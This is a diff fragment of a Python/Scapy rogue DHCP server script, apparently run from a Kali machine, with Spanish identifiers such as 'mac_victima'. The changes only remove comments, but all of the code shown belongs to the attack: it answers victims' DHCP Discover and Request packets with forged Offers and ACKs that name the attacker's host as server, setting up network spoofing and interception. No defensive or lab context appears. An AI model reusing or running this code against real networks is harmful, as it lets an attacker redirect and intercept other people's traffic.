@@ -17,7 +17,6 @@ def servidor_dhcp_falso(pkt):
     if not pkt.haslayer(DHCP) or not pkt.haslayer(BOOTP):
         return
 
-    # Ignorar paquetes que vienen de nosotros mismos
     if pkt[IP].src == IP_KALI:
         return
 
@@ -29,7 +28,7 @@ def servidor_dhcp_falso(pkt):
     xid_cliente = pkt[BOOTP].xid
     mac_bytes   = bytes.fromhex(mac_victima.replace(":", "")) + b'\x00' * 10
 
-    if tipo_mensaje == 1:  # Discover → Offer
+    if tipo_mensaje == 1:
         print(f"[*] Discover de {mac_victima} — enviando Offer...")
 
         eth   = Ether(src=get_if_hwaddr(conf.iface), dst="ff:ff:ff:ff:ff:ff")
@@ -38,7 +37,7 @@ def servidor_dhcp_falso(pkt):
         bootp = BOOTP(
             op=2,
             xid=xid_cliente,
-            flags=0x8000,           # ← broadcast flag, fuerza respuesta broadcast
+            flags=0x8000,
             yiaddr=IP_FALSA_OFERTA,
             siaddr=IP_KALI,
             giaddr="0.0.0.0",
@@ -58,8 +57,7 @@ def servidor_dhcp_falso(pkt):
         ])
         sendp(eth/ip/udp/bootp/dhcp, iface=conf.iface, verbose=False)
 
-    elif tipo_mensaje == 3:  # Request → ACK
-        # Verificar que el Request es para nosotros
+    elif tipo_mensaje == 3:
         server_id = None
         for opt in pkt[DHCP].options:
             if isinstance(opt, tuple) and opt[0] == 'server_id':
